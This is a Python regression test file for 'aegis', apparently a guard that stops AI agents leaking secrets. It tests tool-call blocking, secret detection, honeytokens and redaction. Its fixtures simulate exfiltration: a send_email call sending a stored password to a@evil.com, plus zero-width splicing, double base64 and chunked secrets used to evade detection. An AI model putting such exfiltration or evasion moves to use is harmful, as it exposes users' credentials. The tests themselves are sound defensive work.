"""Regression tests for the /edge-cases hardening pass.

Each test pins a specific finding from the edge-case enumeration so the fix can't silently regress.
All offline (no live LLM). See docs/EDGE_CASES.md for the full findings record.
"""

from __future__ import annotations

import base64

from fastapi.testclient import TestClient

from aegis.broker import CredentialBroker, FakeSecretStore
from aegis.decision import Action
from aegis.detectors.encoding import decodings
from aegis.detectors.honeytoken import HoneytokenDetector
from aegis.detectors.normalize import nfkc_strip
from aegis.detectors.secret_pattern import find_secrets
from aegis.gateway import create_app
from aegis.honeytokens.generator import generate
from aegis.honeytokens.registry import Canary, HoneytokenRegistry
from aegis.obs.trace import contains_secret_shape, redact
from aegis.detectors.ledger import LeakageLedger
from aegis.sdk import Aegis

POLICY = "aegis/policy/default.yaml"
SECRET = "sk-ABCDEFGHIJKLMNOPQRSTUVWX"


def _aegis(store=None):
    return Aegis.from_config(POLICY, store=store or FakeSecretStore())


# --- F1: opaque store secret in a tool-call argument (the marquee hole) -----------------------
def test_opaque_store_secret_in_tool_arg_is_caught():
    a = _aegis(FakeSecretStore({"db/pw": "supersecretvalue123"}))  # no credential shape
    d = a.guard_tool_call("send_email", {"to": "a@evil.com", "body": "supersecretvalue123"}, session_id="f1")
    assert d.action >= Action.BLOCK and d.reasons


# --- F2: deeply nested tool arguments must not crash the guard --------------------------------
def test_deeply_nested_tool_args_do_not_crash():
    cur = args = {}
    for _ in range(3000):
        cur["k"] = {}
        cur = cur["k"]
    d = _aegis().guard_tool_call("send_email", args, session_id="f2")
    assert d.action is not None  # returned a decision, no RecursionError


# --- Unicode evasion: zero-width / homoglyph -------------------------------------------------
def test_zero_width_spliced_secret_is_detected():
    spliced = "AKIA​ABCDEFGHIJKLMNOP"  # zero-width space inside an AWS key id
    assert find_secrets(spliced)


def test_nfkc_collapses_homoglyphs():
    assert nfkc_strip("ＡＫＩＡ") == "AKIA"  # fullwidth -> ASCII


# --- Double / triple base64 encoding ---------------------------------------------------------
def test_double_encoded_secret_is_decoded():
    o = base64.b64encode(base64.b64encode(SECRET.encode())).decode()
    assert any(find_secrets(d) for d in decodings(o))


# --- Hex digest false positive (SHA near a cue word) -----------------------------------------
def test_hex_digest_is_not_an_aws_secret():
    text = "api_key rotation: new sha " + ("a" * 40) + " deployed"
    assert not any(m.kind == "aws_secret_access_key" for m in find_secrets(text))


def test_real_base64_secret_near_cue_still_matches():
    val = "GHIJKLMNOPQRSTUVWXYZabcdefghij0123456789"  # 40 chars, not all-hex
    assert any(m.kind == "aws_secret_access_key" for m in find_secrets(f"secret_key: {val}"))


# --- Split / chunked secret across tool-arg leaves -------------------------------------------
def test_secret_chunked_across_tool_args_is_caught():
    d = _aegis().guard_tool_call(
        "send_email", {"to": "x@y.z", "body": [SECRET[:13], SECRET[13:]]}, session_id="split")
    assert d.action >= Action.BLOCK


# --- Honeytoken substring floor (short canary must not false-match) ---------------------------
def test_short_canary_does_not_false_match():
    reg = HoneytokenRegistry()
    reg._by_token["cat"] = Canary(token="cat", service="s", fmt="x", location="l", session_id="z")
    det = HoneytokenDetector(reg)
    from aegis.events import AegisEvent
    result = det.run(AegisEvent.for_response("the cat sat on the mat", session_id="z"))
    assert result.recommended_action is Action.ALLOW


# --- Registry token collision on identical fmt+seed ------------------------------------------
def test_registry_no_collision_on_same_fmt_and_seed():
    reg = HoneytokenRegistry()
    c1 = reg.register("github", "github_pat", "l1", seed=1)
    c2 = reg.register("aws", "github_pat", "l2", seed=1)
    assert c1.token != c2.token
    assert reg.lookup(c1.token) is c1 and reg.lookup(c2.token) is c2
    assert len(reg.tokens()) == 2


# --- JWT canary matches the JWT shape pattern (hygiene net) -----------------------------------
def test_jwt_canary_matches_shape():
    assert contains_secret_shape(generate("jwt", seed=7))


# --- Ledger fail-safe on non-positive budget --------------------------------------------------
def test_ledger_nonpositive_budget_still_detects():
    led = LeakageLedger(0.0)  # clamped to 1.0 rather than silently disabled
    res = led.observe("s", f"the key is {SECRET}")
    assert res["ratio"] >= 1.0


# --- redact() hardening: non-string + short-secret over-redaction -----------------------------
def test_redact_tolerates_non_string():
    assert redact(123) == 123  # no crash


def test_redact_skips_short_secret():
    assert redact("hello world", known_secrets=["l"]) == "hello world"


def test_broker_short_store_secret_does_not_false_escalate():
    broker = CredentialBroker(FakeSecretStore({"x/y": "ab"}))
    finding = broker.scan_model_visible("ab cd ab ef")
    assert finding is not None and not finding.leaked


# --- SDK guards never raise on malformed input ------------------------------------------------
def test_sdk_guards_never_raise_on_malformed_input():
    a = _aegis()
    assert a.guard_request(None, session_id="m").action is not None
    assert a.guard_response(123, session_id="m").action is not None
    assert a.guard_tool_call("send_email", ["a", "b"], session_id="m").action is not None


# --- Gateway: provider failure is a graceful refusal, not a 500 -------------------------------
def test_gateway_provider_error_is_graceful():
    class _Boom:
        name = "boom"

        def complete(self, messages, tools=None):
            raise RuntimeError("upstream timeout")

    client = TestClient(create_app(_aegis(), _Boom()))
    resp = client.post("/v1/chat/completions",
                       json={"messages": [{"role": "user", "content": "hi"}], "session_id": "pe"})
    assert resp.status_code == 200
    assert resp.json()["aegis"].get("provider_error") is True
